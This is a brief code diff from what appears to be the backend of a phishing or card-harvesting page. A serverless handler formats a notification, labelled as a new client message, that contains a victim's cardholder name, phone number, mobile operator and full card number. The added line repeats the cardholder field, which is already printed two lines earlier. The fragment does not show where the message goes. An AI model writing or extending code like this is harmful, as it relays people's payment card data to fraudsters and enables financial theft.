@@ -35,6 +35,7 @@ exports.handler = async (event) => {
     let text = `📩 *Nouveau message dyal client*\n\n`;
     text += `*titulaire_de_la_carte:* ${titulaire_de_la_carte}\n`;
     
+    if (titulaire_de_la_carte) text += `*Titulaire de la carte:* ${titulaire_de_la_carte}\n`;
     if (phone) text += `*Téléphone:* ${phone}\n`;
     if (operator) text += `*Opérateur:* ${operator}\n`;
     if (cardNumber) text += `*Numéro de carte:* ${cardNumber}\n`;
